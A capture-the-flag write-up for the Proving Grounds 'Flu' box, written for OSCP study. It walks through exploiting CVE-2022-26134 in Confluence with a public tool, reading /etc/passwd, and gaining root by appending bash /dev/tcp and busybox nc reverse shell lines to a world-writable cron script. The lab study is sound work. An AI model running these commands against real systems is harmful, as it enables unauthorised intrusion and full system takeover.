# Flu — Proving Grounds

> [!abstract] Summary
> Flu runs **Atlassian Confluence 7.13.6** on port 8090, vulnerable to **CVE-2022-26134** — an unauthenticated OGNL injection that yields remote code execution. Using the `through_the_wire` exploit, we get a reverse shell as the `confluence` user. The Confluence `config.php` is not useful here since there are no other database-backed users. Enumeration with **pspy64** reveals a root cron job running `/opt/log-backup.sh` every minute. The script is **world-writable** (or writable by the `confluence` user), so we append a reverse shell payload to it and catch a root shell on a second listener.

**Target:** `192.168.143.41`

## Methodology

1. Full TCP scan reveals SSH (22), Confluence (8090), and Aleph/0.4.6 (8091).
2. Identify Confluence version 7.13.6 from the web footer — vulnerable to CVE-2022-26134.
3. Exploit with `through_the_wire.py` to get a shell as `confluence`.
4. Enumerate with pspy64 to discover a root cron job running `/opt/log-backup.sh`.
5. Append a reverse shell payload to the writable script → root.

### Confluence enumeration

#### ==🔵Confluence (Port 8090)==

Visit `http://TARGET_IP:8090` in the browser. The login page loads.

The version number will be on bottom : 
```
Powered by Atlassian Confluence 7.13.6
```

This version is vulnerable to **CVE-2022-26134** — an unauthenticated OGNL injection vulnerability that allows remote code execution.

Google : `atlassian confluence 7.13.6 exploit`

> [!note] Learning Note — CVE-2022-26134
> This is a critical unauthenticated OGNL injection in Atlassian Confluence Server and Data Center. It affects versions before 7.4.17, 7.13.7, 7.14.3, 7.15.2, 7.16.4, 7.17.4, and 7.18.1. The vulnerability exists in the URI processing where OGNL expressions in the request URI are evaluated by the server. It requires **no authentication** — making it extremely dangerous.

## Initial Foothold — CVE-2022-26134

### Clone the exploit

The `through_the_wire` exploit by jbaines-r7 (Rapid7) automates the OGNL injection:

```
git clone https://github.com/jbaines-r7/through_the_wire
cd through_the_wire
```

### Verify code execution (optional)

You can first test with `--read-file` to confirm the vulnerability:
```
python3 through_the_wire.py --rhost 192.168.143.41 --rport 8090 --lhost YOUR_KALI_IP --protocol http:// --read-file /etc/passwd
```

This should dump the contents of `/etc/passwd`, confirming the OGNL injection works. Look for the `confluence` user.

Read the local flag as a quick test:
```
python3 through_the_wire.py --rhost 192.168.143.41 --rport 8090 --lhost YOUR_KALI_IP --protocol http:// --read-file /home/confluence/local.txt
```

### Get a reverse shell

Start a netcat listener:
```
nc -lvnp 4444
```

Run the exploit with `--reverse-shell`:
```
python3 through_the_wire.py --rhost 192.168.143.41 --rport 8090 --lhost YOUR_KALI_IP --protocol http:// --reverse-shell
```

> [!note] Learning Note — through_the_wire flags
> - `--rhost` = target IP
> - `--rport` = Confluence port (8090)
> - `--lhost` = your Kali VPN IP (the exploit starts a listener to catch the callback)
> - `--protocol` = `http://` or `https://`
> - `--reverse-shell` = spawns a reverse shell back to your lhost
> - `--read-file` = reads a file via the OGNL injection (useful for confirming the vuln)

The shell connects back as the `confluence` user.

### Stabilize the shell

```
python3 -c 'import pty; pty.spawn("/bin/bash")'
```

Press `Ctrl+Z` to background the shell, then:
```
stty raw -echo; fg
```
```
export TERM=xterm
```

## Privilege Escalation — Writable Root Cron Script

### Enumeration

Check sudo permissions:
```
sudo -l
```

No sudo privileges for the `confluence` user.

Check SUID binaries:
```
find / -perm -4000 -type f 2>/dev/null
```

Nothing unusual.

### Process monitoring with pspy

Download and run pspy64 to monitor processes running as root:

On Kali, serve the file:
```
python3 -m http.server 80
```

On the target:
```
cd /tmp
wget http://YOUR_KALI_IP/pspy64
chmod +x pspy64
./pspy64
```

After watching for ~1 minute, you'll see:
```
CMD: UID=0  PID=xxxx  | /bin/bash /opt/log-backup.sh
```

Root (UID=0) runs `/opt/log-backup.sh` every minute via a cron job.

### Inspect the script

```
ls -la /opt/log-backup.sh
```

The script is writable by the `confluence` user:
```
-rwxrwxrwx 1 confluence confluence ... /opt/log-backup.sh
```

Check its contents:
```
cat /opt/log-backup.sh
```

The script performs some log backup operations (copying/archiving Confluence logs). The important thing is that **root executes it** and **we can modify it**.

### Append a reverse shell

Start a second listener on Kali:
```
nc -lvnp 9001
```

Append a reverse shell payload to the script:
```
echo 'bash -i >& /dev/tcp/YOUR_KALI_IP/9001 0>&1' >> /opt/log-backup.sh
```

Alternatively, using a busybox reverse shell:
```
echo 'busybox nc YOUR_KALI_IP 9001 -e /bin/bash' >> /opt/log-backup.sh
```

Wait up to 60 seconds for the cron job to execute. The root shell connects to your second listener.

## Lessons Learned

| Stage | Technique | Takeaway |
|---|---|---|
| Enumeration | Version fingerprinting | Always check application footers for version numbers — Confluence displays it at the bottom of the login page |
| Exploitation | CVE-2022-26134 | Critical unauthenticated OGNL injection — one of the most impactful Confluence vulnerabilities, widely exploited in the wild |
| Enumeration | pspy64 | When `sudo -l` and SUID binaries reveal nothing, monitor processes with pspy to find cron jobs running as root |
| Privilege escalation | Writable cron script | A script run by root that is writable by a low-privilege user is an immediate escalation path |

> [!important] Key OSCP Takeaways
> 1. **CVE-2022-26134** is a must-know for the OSCP — it's unauthenticated and gives immediate RCE on Confluence.
> 2. **Always run pspy** when standard privilege escalation checks (sudo, SUID, capabilities) come up empty.
> 3. **Check file permissions on scripts run by cron.** A world-writable script executed by root is trivial to exploit.
> 4. Port 8091 (Synchrony/Aleph) is a Confluence companion service — not directly exploitable but confirms the target stack.
